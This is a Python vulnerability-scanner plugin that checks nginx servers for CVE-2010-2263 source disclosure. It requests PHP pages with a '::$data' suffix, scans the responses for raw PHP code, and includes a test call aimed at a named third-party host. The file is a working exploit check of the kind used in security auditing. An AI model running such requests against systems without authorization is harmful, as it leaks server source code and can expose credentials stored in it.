from ..miniCurl import Curl
from ..t  import T
#!/usr/bin/env python
#-*- encoding:utf-8 -*-
#__author__ = '0x3D'
#CVE: 2010-2263
import urlparse
import re

class P(T):
    def __init__(self):
        T.__init__(self)
    def verify(self,head='',context='',ip='',port='',productname={},keywords='',hackinfo=''):
        arg='http://'+ip+':'+port+'/'
        curl=Curl()
        result = {}
        result['result']=False

        url = arg
        payloads = ['index.php','default.php']
        code, head, noexistbody, error, _ = curl.curl(arg+'noexistpagenoexistpage.php::$data')
        for payload in payloads:
            payload +='::$data'
            addr = url + payload
            code, head, body, error, _ = curl.curl(addr)
            if code == 200:
                m = re.findall(r'<\?(php|)(.*?)\?>',body)
                for x in m:
                    if x[1] in noexistbody:
                        continue
                    if x[0]=='php':
                        output(addr,result,'hole')
                        break
                    if '$' in x[1] or 'include' in x[1]:
                        output(addr,result,'hole')
                        break
                            
    

        del curl
        return result


def output(url,result,label):
    info = url + '  nginx  Vul '
    result['result']=True
    result['VerifyInfo'] = {}
    result['VerifyInfo']['type']='file read Vul'
    result['VerifyInfo']['URL'] =url
    result['VerifyInfo']['payload']='/root/github/poccreate/thirdparty/nginx/nginx_c3bb9f1f2f151c7043d159ca6f77babb.py'
    result['VerifyInfo']['level']=label
    result['VerifyInfo']['result'] =info

if __name__ == '__main__':
    print P().verify(ip='http://yunlai.cn:803/sfdsfds/',port='80')

#/root/github/poccreate/thirdparty/www/www_c3bb9f1f2f151c7043d159ca6f77babb.py
#/root/github/poccreate/codesrc/exp-181.py